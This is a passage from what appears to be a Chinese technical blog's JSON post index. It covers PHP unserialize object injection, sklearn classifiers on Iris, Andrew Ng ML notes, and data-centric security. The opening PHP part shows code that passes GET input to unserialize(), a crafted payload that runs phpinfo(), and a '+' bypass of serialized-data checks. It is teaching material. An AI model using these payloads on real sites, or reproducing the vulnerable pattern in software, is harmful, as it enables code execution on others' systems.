class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">unserialize($_GET[<span class=\"string\">'saved_code'</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>提交: <code>unserialize.php?saved_code=O:7:%22Example%22:1:{s:3:%22var%22;s:10:%22phpinfo%28%29;%22;}</code>,即执行phpinfo()</p>\n<h4 id=\"绕过方法\"><a href=\"#绕过方法\" class=\"headerlink\" title=\"绕过方法\"></a>绕过方法</h4><p>有一些程序中会判断用户输入是不是一个序列化的数据，常见的代码如下<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$token = $data[<span class=\"number\">0</span>];  </span><br><span class=\"line\"><span class=\"keyword\">switch</span> ( $token ) &#123;  </span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"string\">'s'</span> :  </span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( <span class=\"string\">'\"'</span> !== $data[$length<span class=\"number\">-2</span>] )  </span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;  </span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"string\">'a'</span> :  </span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"string\">'O'</span> :  </span><br><span class=\"line\">        <span class=\"keyword\">return</span> (bool) preg_match( <span class=\"string\">\"/^&#123;$token&#125;:[0-9]+:/s\"</span>, $data );  </span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"string\">'b'</span> :  </span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"string\">'i'</span> :  </span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"string\">'d'</span> :  </span><br><span class=\"line\">        <span class=\"keyword\">return</span> (bool) preg_match( <span class=\"string\">\"/^&#123;$token&#125;:[0-9.E-]+;\\$/\"</span>, $data );</span><br></pre></td></tr></table></figure></p>\n<p>这个可以用+来绕过，这也属于PHP的一种特性: <code>O:+4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;}</code></p>\n","categories":["Web安全"],"tags":["PHP","代码注入","命令注入"]},{"title":"sklearn训练逻辑回归和感知机模型","url":"http://www.beesfun.com/2017/04/12/sklearn训练逻辑回归和感知机模型/","content":"<p>调用sklearn内置的逻辑回归和感知机训练鸢尾花（Iris）数据集。<br><a id=\"more\"></a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># author: janes</span></span><br><span class=\"line\"><span class=\"comment\"># date: 2017年4月11日 18:30</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn <span class=\"keyword\">import</span> datasets</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.model_selection <span class=\"keyword\">import</span> train_test_split</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.preprocessing <span class=\"keyword\">import</span> StandardScaler</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.linear_model <span class=\"keyword\">import</span> Perceptron</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.linear_model <span class=\"keyword\">import</span> LogisticRegression</span><br><span class=\"line\"><span class=\"keyword\">from</span> sklearn.metrics <span class=\"keyword\">import</span> accuracy_score</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">from</span> matplotlib.colors <span class=\"keyword\">import</span> ListedColormap</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">plot_decision_regions</span><span class=\"params\">(X, y, classifier, test_idx=None, resolution=<span class=\"number\">0.02</span>)</span>:</span></span><br><span class=\"line\">    <span class=\"comment\"># setup marker generator and color map</span></span><br><span class=\"line\">    markers = (<span class=\"string\">'s'</span>, <span class=\"string\">'x'</span>, <span class=\"string\">'o'</span>, <span class=\"string\">'^'</span>, <span class=\"string\">'v'</span>)</span><br><span class=\"line\">    colors = (<span class=\"string\">'red'</span>, <span class=\"string\">'blue'</span>, <span class=\"string\">'lightgreen'</span>, <span class=\"string\">'gray'</span>, <span class=\"string\">'cyan'</span>)</span><br><span class=\"line\">    cmap = ListedColormap(colors[:len(np.unique(y))])</span><br><span class=\"line\">    <span class=\"comment\"># plot the decision surface</span></span><br><span class=\"line\">    x1_min, x1_max = X[:, <span class=\"number\">0</span>].min() - <span class=\"number\">1</span>, X[:, <span class=\"number\">0</span>].max() + <span class=\"number\">1</span></span><br><span class=\"line\">    x2_min, x2_max = X[:, <span class=\"number\">1</span>].min() - <span class=\"number\">1</span>, X[:, <span class=\"number\">1</span>].max() + <span class=\"number\">1</span></span><br><span class=\"line\">    xx1, xx2 = np.meshgrid(np.arange(x1_min, x1_max, resolution),</span><br><span class=\"line\">                           np.arange(x2_min, x2_max, resolution))</span><br><span class=\"line\">    Z = classifier.predict(np.array([xx1.ravel(), xx2.ravel()]).T)</span><br><span class=\"line\">    Z = Z.reshape(xx1.shape)</span><br><span class=\"line\">    plt.contourf(xx1, xx2, Z, alpha=<span class=\"number\">0.4</span>, cmap=cmap)</span><br><span class=\"line\">    plt.xlim(xx1.min(), xx1.max())</span><br><span class=\"line\">    plt.ylim(xx2.min(), xx2.max())</span><br><span class=\"line\">    <span class=\"comment\"># plot class samples</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> idx, cl <span class=\"keyword\">in</span> enumerate(np.unique(y)):</span><br><span class=\"line\">        plt.scatter(x=X[y == cl, <span class=\"number\">0</span>], y=X[y == cl, <span class=\"number\">1</span>], alpha=<span class=\"number\">0.8</span>, c=cmap(idx),</span><br><span class=\"line\">                    marker=markers[idx], label=cl)</span><br><span class=\"line\">    <span class=\"comment\"># highlight test samples</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> test_idx:</span><br><span class=\"line\">        X_test, y_test = X[test_idx, :], y[test_idx]</span><br><span class=\"line\">        plt.scatter(X_test[:, <span class=\"number\">0</span>], X_test[:, <span class=\"number\">1</span>], c=<span class=\"string\">''</span>, alpha=<span class=\"number\">1.0</span>, linewidth=<span class=\"number\">1</span>,</span><br><span class=\"line\">                    marker=<span class=\"string\">'o'</span>, s=<span class=\"number\">55</span>, label=<span class=\"string\">'test set'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">test_perceptron</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    iris = datasets.load_iris()</span><br><span class=\"line\">    <span class=\"comment\"># choose petal length and petal width as feature</span></span><br><span class=\"line\">    X = iris.data[:, [<span class=\"number\">2</span>, <span class=\"number\">3</span>]]</span><br><span class=\"line\">    y = iris.target</span><br><span class=\"line\">    <span class=\"comment\"># 随机拿出数据集中30%的部分做测试,</span></span><br><span class=\"line\">    <span class=\"comment\"># 设置random_state(not None), 相当于设置随机数种子，每次运行随机抽样的结果相同</span></span><br><span class=\"line\">    X_train, X_test, y_train, y_test = train_test_split(X, y,</span><br><span class=\"line\">                                                        test_size=<span class=\"number\">0.3</span>,</span><br><span class=\"line\">                                                        random_state=<span class=\"keyword\">None</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 为了追求机器学习和最优化算法的最佳性能，进行特征缩放</span></span><br><span class=\"line\">    sc = StandardScaler()</span><br><span class=\"line\">    sc.fit(X_train)</span><br><span class=\"line\">    X_train_std = sc.transform(X_train)</span><br><span class=\"line\">    <span class=\"comment\"># 用\"同样的参数\"来标准化测试集，使得测试集和训练集之间有可比性</span></span><br><span class=\"line\">    X_test_std = sc.transform(X_test)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># n_iter：可以理解成梯度下降中迭代的次数</span></span><br><span class=\"line\">    <span class=\"comment\"># eta0：可以理解成梯度下降中的学习率</span></span><br><span class=\"line\">    <span class=\"comment\"># random_state：设置随机种子(not None)，为了每次迭代都有相同的训练集顺序</span></span><br><span class=\"line\">    ppn = Perceptron(n_iter=<span class=\"number\">100</span>, eta0=<span class=\"number\">0.05</span>, random_state=<span class=\"keyword\">None</span>)</span><br><span class=\"line\">    ppn.fit(X_train_std, y_train)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 分类测试集，将返回一个测试结果的数组</span></span><br><span class=\"line\">    y_pred = ppn.predict(X_test_std)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># plt.scatter(np.arange(0, len(y_pred)), y_pred, c='b', marker='|',)</span></span><br><span class=\"line\">    <span class=\"comment\"># plt.scatter(np.arange(0, len(y_test)), y_test, c='r', marker='_',)</span></span><br><span class=\"line\">    <span class=\"comment\"># plt.show()</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 计算模型在测试集上的准确性</span></span><br><span class=\"line\">    score = accuracy_score(y_test, y_pred)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> score</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">test_logistic</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    iris = datasets.load_iris()</span><br><span class=\"line\">    <span class=\"comment\"># choose petal length and petal width as feature</span></span><br><span class=\"line\">    X = iris.data[:, [<span class=\"number\">2</span>, <span class=\"number\">3</span>]]</span><br><span class=\"line\">    y = iris.target</span><br><span class=\"line\">    <span class=\"comment\"># 随机拿出数据集中30%的部分做测试,</span></span><br><span class=\"line\">    <span class=\"comment\"># 设置random_state(not None), 相当于设置随机数种子，每次运行随机抽样的结果相同</span></span><br><span class=\"line\">    X_train, X_test, y_train, y_test = train_test_split(X, y,</span><br><span class=\"line\">                                                        test_size=<span class=\"number\">0.3</span>,</span><br><span class=\"line\">                                                        random_state=<span class=\"keyword\">None</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 为了追求机器学习和最优化算法的最佳性能，进行特征缩放</span></span><br><span class=\"line\">    sc = StandardScaler()</span><br><span class=\"line\">    sc.fit(X_train)</span><br><span class=\"line\">    X_train_std = sc.transform(X_train)</span><br><span class=\"line\">    <span class=\"comment\"># 用\"同样的参数\"来标准化测试集，使得测试集和训练集之间有可比性</span></span><br><span class=\"line\">    X_test_std = sc.transform(X_test)</span><br><span class=\"line\"></span><br><span class=\"line\">    lr = LogisticRegression(C=<span class=\"number\">1000.0</span>, random_state=<span class=\"number\">0</span>)</span><br><span class=\"line\">    lr.fit(X_train_std, y_train)</span><br><span class=\"line\">    <span class=\"comment\"># 查看第一个测试样本属于各个类别的概率</span></span><br><span class=\"line\">    <span class=\"comment\"># predict_proba返回的是一个两列的矩阵，矩阵的每一行代表的是对一个事件的预测结果，</span></span><br><span class=\"line\">    <span class=\"comment\"># 第一列代表该事件不会发生的概率，第二列代表的是该事件会发生的概率</span></span><br><span class=\"line\">    lr.predict_proba(X_test_std[<span class=\"number\">0</span>, :].reshape(<span class=\"number\">1</span>, <span class=\"number\">-1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># vstack(): Stack arrays in sequence vertically(row wise).</span></span><br><span class=\"line\">    X_combined_std = np.vstack((X_train_std, X_test_std))</span><br><span class=\"line\">    y_combined = np.hstack((y_train, y_test))</span><br><span class=\"line\">    plot_decision_regions(X_combined_std, y_combined, classifier=lr,</span><br><span class=\"line\">                          test_idx=range(<span class=\"number\">105</span>, <span class=\"number\">150</span>))</span><br><span class=\"line\">    plt.xlabel(<span class=\"string\">'petal length [standardized]'</span>)</span><br><span class=\"line\">    plt.ylabel(<span class=\"string\">'petal width [standardized]'</span>)</span><br><span class=\"line\">    plt.legend(loc=<span class=\"string\">'upper left'</span>)</span><br><span class=\"line\">    plt.show()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    <span class=\"comment\"># for _ in range(30):</span></span><br><span class=\"line\">    <span class=\"comment\">#     print(test_perceptron())</span></span><br><span class=\"line\">    test_logistic()</span><br></pre></td></tr></table></figure>\n","categories":["机器学习"],"tags":["感知机","逻辑回归","sklearn"]},{"title":"吴恩达机器学习笔记(二)","url":"http://www.beesfun.com/2017/04/11/吴恩达机器学习笔记-二/","content":"<h2 id=\"第三周\"><a href=\"#第三周\" class=\"headerlink\" title=\"第三周\"></a>第三周</h2><h3 id=\"逻辑回归模型\"><a href=\"#逻辑回归模型\" class=\"headerlink\" title=\"逻辑回归模型\"></a>逻辑回归模型</h3><p>关于分类问题，首先讨论二分类问题，即输出值$y$只有两种值0和1，$y=1$表示正分类，$y=0$表示负分类。预测函数<script type=\"math/tex\">h_\\theta(x)</script>表示如下:</p>\n<script type=\"math/tex; mode=display\">h_\\theta(x) = g(\\theta^T x)</script><script type=\"math/tex; mode=display\">z = \\theta^T x</script><script type=\"math/tex; mode=display\">g(z) = \\dfrac{1}{1 + e^{-z}}</script><p>$g(z)$为”Sigmoid”函数，也称为逻辑函数。<br><img src=\"/2017/04/11/吴恩达机器学习笔记-二/001.png\"></p>\n<p>$h_{\\theta}(x)$表示的是输出为1的概率。</p>\n<script type=\"math/tex; mode=display\">h_\\theta(x) = P(y=1 | x ; \\theta) = 1 - P(y=0 | x ; \\theta)</script><script type=\"math/tex; mode=display\">P(y = 0 | x;\\theta) + P(y = 1 | x ; \\theta) = 1</script><a id=\"more\"></a>\n<h4 id=\"判定边界\"><a href=\"#判定边界\" class=\"headerlink\" title=\"判定边界\"></a>判定边界</h4><script type=\"math/tex; mode=display\">h_\\theta(x) \\geq 0.5 \\Rightarrow y = 1</script><script type=\"math/tex; mode=display\">h_\\theta(x) < 0.5 \\Rightarrow y = 0</script><script type=\"math/tex; mode=display\">\\theta^T x \\geq 0 \\Rightarrow y = 1</script><script type=\"math/tex; mode=display\">\\theta^T x < 0 \\Rightarrow y = 0</script><h3 id=\"代价函数\"><a href=\"#代价函数\" class=\"headerlink\" title=\"代价函数\"></a>代价函数</h3><p>逻辑回归代价函数定义如下:</p>\n<script type=\"math/tex; mode=display\">J(\\theta) = \\dfrac{1}{m} \\sum_{i=1}^m \\mathrm{Cost}(h_\\theta(x^{(i)}),y^{(i)})</script><script type=\"math/tex; mode=display\">\\mathrm{Cost}(h_\\theta(x),y) = -\\log(h_\\theta(x))   \\text{if y = 1}</script><script type=\"math/tex; mode=display\">\\mathrm{Cost}(h_\\theta(x),y) = -\\log(1-h_\\theta(x)) \\text{if y = 0}</script><p>简化代价函数:</p>\n<script type=\"math/tex; mode=display\">\\mathrm{Cost}(h_\\theta(x),y) = - y \\; \\log(h_\\theta(x)) - (1 - y) \\log(1 - h_\\theta(x))</script><script type=\"math/tex; mode=display\">J(\\theta) = - \\frac{1}{m} \\displaystyle \\sum_{i=1}^m [y^{(i)}\\log (h_\\theta (x^{(i)})) + (1 - y^{(i)})\\log (1 - h_\\theta(x^{(i)}))]</script><p>根据代价函数，可以得到如下结果:</p>\n<script type=\"math/tex; mode=display\">\\mathrm{Cost}(h_\\theta(x),y) = 0 \\text{ if } h_\\theta(x) = y</script><script type=\"math/tex; mode=display\">\\mathrm{Cost}(h_\\theta(x),y) \\rightarrow \\infty \\text{ if } y = 0  \\mathrm{and} h_\\theta(x) \\rightarrow 1</script><script type=\"math/tex; mode=display\">\\mathrm{Cost}(h_\\theta(x),y) \\rightarrow \\infty \\text{ if } y = 1  \\mathrm{and} h_\\theta(x) \\rightarrow 0</script><p>矩阵表达式如下($X$为设计矩阵[mx(n+1)]):</p>\n<script type=\"math/tex; mode=display\">h = g(X\\theta)</script><script type=\"math/tex; mode=display\">J(\\theta) = \\frac{1}{m} \\cdot \\left(-y^{T}\\log(h)-(1-y)^{T}\\log(1-h)\\right)</script><h3 id=\"梯度下降\"><a href=\"#梯度下降\" class=\"headerlink\" title=\"梯度下降\"></a>梯度下降</h3><script type=\"math/tex; mode=display\">J(\\theta) = \\frac{1}{m} \\cdot \\left(-y^{T}\\log(h)-(1-y)^{T}\\log(1-h)\\right)</script><p>要使代价函数<script type=\"math/tex\">J(\\theta)</script>最小，依旧采用求偏导的方式，同时更新下面表达式:</p>\n<script type=\"math/tex; mode=display\">\\theta_j := \\theta_j - \\alpha \\dfrac{\\partial}{\\partial \\theta_j}J(\\theta)</script><p>矩阵表达式如下:</p>\n<script type=\"math/tex; mode=display\">\\theta := \\theta - \\frac{\\alpha}{m} X^{T} (g(X \\theta ) - \\vec{y})</script><p>优化$\\theta$,除了梯度下降算法，还有”Conjugate gradient”, “BFGS”, 和”L-BFGS”等其他优化算法，能更快更精确的优化$\\theta$参数,但是算法也更复杂。</p>\n<h3 id=\"多分类-One-vs-all\"><a href=\"#多分类-One-vs-all\" class=\"headerlink\" title=\"多分类: One-vs-all\"></a>多分类: One-vs-all</h3><script type=\"math/tex; mode=display\">y \\in \\lbrace0, 1 ... n\\rbrace</script><script type=\"math/tex; mode=display\">h_\\theta^{(0)}(x) = P(y = 0 | x ; \\theta)</script><script type=\"math/tex; mode=display\">h_\\theta^{(1)}(x) = P(y = 1 | x ; \\theta)</script><script type=\"math/tex; mode=display\">\\cdots</script><script type=\"math/tex; mode=display\">h_\\theta^{(n)}(x) = P(y = n | x ; \\theta)</script><script type=\"math/tex; mode=display\">\\mathrm{prediction} = \\max_i( h_\\theta ^{(i)}(x) )</script><h3 id=\"过拟合\"><a href=\"#过拟合\" class=\"headerlink\" title=\"过拟合\"></a>过拟合</h3><p>通常有两种方式处理过拟合问题</p>\n<ul>\n<li><p>减少样本特征数量</p>\n<ul>\n<li>手动选择所需的特征</li>\n<li>使用模型选择算法</li>\n</ul>\n</li>\n<li><p>正则化</p>\n<ul>\n<li>保留所有的特征，但是减小参数$\\theta_j$的大小</li>\n<li>当拥有大量有用的特征时，正则化是有效的</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"正则化线性回归\"><a href=\"#正则化线性回归\" class=\"headerlink\" title=\"正则化线性回归\"></a>正则化线性回归</h3><p>引入正则化参数$\\lambda$，$\\lambda$过大可能造成欠拟合</p>\n<script type=\"math/tex; mode=display\">min_\\theta\\ \\dfrac{1}{2m}\\ \\sum_{i=1}^m (h_\\theta(x^{(i)}) - y^{(i)})^2 + \\lambda\\ \\sum_{j=1}^n \\theta_j^2</script><p>应用梯度下降算法</p>\n<script type=\"math/tex; mode=display\">\\theta_0 := \\theta_0 - \\alpha\\ \\frac{1}{m}\\ \\sum_{i=1}^m (h_\\theta(x^{(i)}) - y^{(i)})x_0^{(i)}</script><script type=\"math/tex; mode=display\">\\theta_j := \\theta_j - \\alpha\\ \\left[ \\left( \\frac{1}{m}\\ \\sum_{i=1}^m (h_\\theta(x^{(i)}) - y^{(i)})x_j^{(i)} \\right) + \\frac{\\lambda}{m}\\theta_j \\right] \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ j \\in \\lbrace 1,2...n</script><script type=\"math/tex; mode=display\">\\theta_j := \\theta_j(1 - \\alpha\\frac{\\lambda}{m}) - \\alpha\\frac{1}{m}\\sum_{i=1}^m(h_\\theta(x^{(i)}) - y^{(i)})x_j^{(i)}</script><p>式子中<script type=\"math/tex\">\\frac{\\lambda}{m}\\theta_j</script>完成正则化。</p>\n<h4 id=\"标准方程表示\"><a href=\"#标准方程表示\" class=\"headerlink\" title=\"标准方程表示\"></a>标准方程表示</h4><script type=\"math/tex; mode=display\">\\theta = \\left( X^TX + \\lambda \\cdot L \\right)^{-1} X^Ty</script><script type=\"math/tex; mode=display\">\\text{where}\\ \\ L = \\begin{bmatrix} 0 & & & & \\newline & 1 & & & \\newline & & 1 & & \\newline & & & \\ddots & \\newline & & & & 1 \\newline\\end{bmatrix}</script>","categories":["机器学习"],"tags":["逻辑回归","分类"]},{"title":"以数据为中心的网络安全","url":"http://www.beesfun.com/2017/04/11/以数据为中心的网络安全/","content":"<h2 id=\"数据为中心的网络安全\"><a href=\"#数据为中心的网络安全\" class=\"headerlink\" title=\"数据为中心的网络安全\"></a>数据为中心的网络安全</h2><p>随着联网设备的多样化以及移动办公的兴起，传统网络安全边界在逐渐消失，当几乎不存在网络边界的时候，怎么保证网络安全？当越来越多的用户可随时通过各种方法接入公司网络的时候，怎么跟踪授权和非授权用户。于是，当今企业安全面对的主要问题，就是：网络安全工具、服务和解决方案的重心一直都在该网络安全“堡垒”概念上，而这又转换成对保护<strong>网络(及硬件)中所有组件的安全产品的重视，以及对业务(及软件)执行相关应用和程序的相对放松</strong>。<br>面对现代错综复杂的网络接入方式，可以采用以数据为中心的网络环境安全方法，重点应首先放在明确有哪些有价值数据和信息，及其对公司的价值，而其他强调技术的策略应围绕保护该有价值数据来发展。<br><a id=\"more\"></a><br>首先需要对数据进行分类(<strong>数据分类</strong>)，知道哪些数据对企业运营的有巨大的价值；然后进行<strong>数据流或业务流分析</strong>，一旦数据被识别并分类，就必须评估数据在网络中的发现点，都有谁访问或“消费”这些数据、分别是出于何种目的，数据从产生到消亡过程中在网络里巡游的全部踪迹，以及数据到达生命周期末尾时是怎么处理的；最后再应用<strong>风险管理模型</strong>，在理解了保护的数据对象是什么的基础上，进行数据流分析，发现数据存储或处理的位置，以及谁能或谁应该访问这些数据。然应用正确的安全控制措施。<br><img src=\"/2017/04/11/以数据为中心的网络安全/001.jpg\"><br>以上公式的元素有:</p>\n<ul>\n<li>风险：比如数据遗失或被盗，数据篡改；</li>\n<li>漏洞：薄弱环节，往往是编程缺陷、编码错误、不当配置等；</li>\n<li>威胁：基本上就是攻击者做事的方法——远程侵入、物理破坏、网络钓鱼、病毒，或者恶意软件；</li>\n<li>对策：以安全之名所做的所有事。包括VPN或防火墙之类访问控制措施的部署、入侵检测系统、警报和监视解决方案、文件完整性监测、白名单解决方案，以及终端防护；</li>\n<li>估值：想保护的东西的价值，还有安全工作的成本</li>\n</ul>\n<p>风险管理模型的目标是要减小风险,减小风险的方法，就是减少环境中漏洞，识别并封锁或威慑威胁，以及实现安全对策以降低漏洞或威胁所留影响的组合。这是一个持续的过程，必须不断考虑技术、人员、公司使命和威胁态势的改变。持续运作的过程，需要被写下来，被遵循，并定期修订以反映运营的最新变化。这种安全方法可被称为安全生命周期，拥有以下特性：</p>\n<ul>\n<li>从知道要保护什么东西开始</li>\n<li>安全需要系统性方法（评估当前位置、记录想去往何方、实现安全架构）</li>\n<li>策略即战略</li>\n<li>架构就是策略得以实施的连贯集成战术集</li>\n<li>没有策略的安全只不过是技术</li>\n</ul>\n","categories":["信息安全"],"tags":["网络安全","数据"]},{"title":"吴恩达机器学习笔记(一)","url":"http://www.beesfun.com/2017/04/08/吴恩达机器学习笔记-一/","content":"<h2 id=\"第一周\"><a href=\"#第一周\" class=\"headerlink\" title=\"第一周\"></a>第一周</h2><h3 id=\"机器学习的定义\"><a href=\"#机器学习的定义\" class=\"headerlink\" title=\"机器学习的定义\"></a>机器学习的定义</h3><p>Tom Mitchell (1998) Well-posed Learning Problem: “A computer program is said to learn from experience E with respect to some task T and some performance measure P, if its performance on T, as measured by P, improves with experience E”.</p>\n<p>对于某类任务T和性能度量P，如果一个计算机程序在T上以P衡量的性能随着经验E而自我完善，那么我们称这个计算机程序在从经验E学习</p>\n<p>机器学习分类: 监督学习(Supervised learning)和无监督学习(Unsupervised learning)</p>\n<a id=\"more\"></a>\n<h3 id=\"监督学习\"><a href=\"#监督学习\" class=\"headerlink\" title=\"监督学习\"></a>监督学习</h3><p>监督学习从给定的训练数据集中学习出一个函数，当新的数据到来时，可以根据这个函数预测结果。监督学习的训练集要求是包括输入和输出，也可以说是特征和目标。训练集中的目标是由人标注的。常见的监督学习算法包括回归分析和统计分类。</p>\n<p>回归问题，是在一个连续的输出上预测结果，即将输入映射到连续的输出函数，而分类问题，是在离散的输出上预测结果，即将输入映射到离散的类别。</p>\n<h3 id=\"无监督学习\"><a href=\"#无监督学习\" class=\"headerlink\" title=\"无监督学习\"></a>无监督学习</h3><p>与监督学习相比，训练集没有人为标注的结果。常见的无监督学习算法有聚类</p>\n<p>无监督学习允许我们在不知道或很少知道正确输出结果样式的情况下，从数据中获取结构，而且不需要了解各种变量对输出结果的影响。通过数据集群中数据变量间的关系，可以推导出结构。并且无监督学习不需要基于预测结果的反馈。</p>\n<h3 id=\"单变量线性回归模型\"><a href=\"#单变量线性回归模型\" class=\"headerlink\" title=\"单变量线性回归模型\"></a>单变量线性回归模型</h3><p>符号表示:</p>\n<p>1.<script type=\"math/tex\">x^{(i)}</script> 表示输入变量，也叫作输入特征，上标i仅仅表示训练集中的第i个样本;<br>2.<script type=\"math/tex\">y^{(i)}</script> 表示输出变量，也叫作目标变量;<br>3.<script type=\"math/tex\">(x^{(i)}, y^{(i)})</script> 表示一个训练样本;<br>4.m表示训练样本的个数, i=1,…,m。</p>\n<img src=\"/2017/04/08/吴恩达机器学习笔记-一/predict.png\">\n<h4 id=\"代价函数\"><a href=\"#代价函数\" class=\"headerlink\" title=\"代价函数\"></a>代价函数</h4><p>函数<code>h</code>称作假设函数(hypothesis), 定义为: <script type=\"math/tex\">h_{\\theta}(x) = \\theta_0 + \\theta_1x</script>, 简写为: $h(x) = \\theta_0 + \\theta_1x$。这里使用线性函数，而没有使用非线性函数，因为线性函数最简单，因此先从线性函数入手, 之后再讨论更复杂的模型。这个线性模型被称为线性回归(linear regression)模型, 使用的是单变量$x$，也称作单变量线性回归。</p>\n<p>那么如何选择 $\\theta_0, \\theta_1$ 使得h(x)接近于训练集中的输出变量$y$。通过定义代价函数$J(\\theta_0, \\theta_1)$，表示$h(x)$的准确性,<br><img src=\"/2017/04/08/吴恩达机器学习笔记-一/CostFunction.png\"><br>当$J(\\theta_0, \\theta_1)$取最小值时，获得最优$h(x)$函数。<br><img 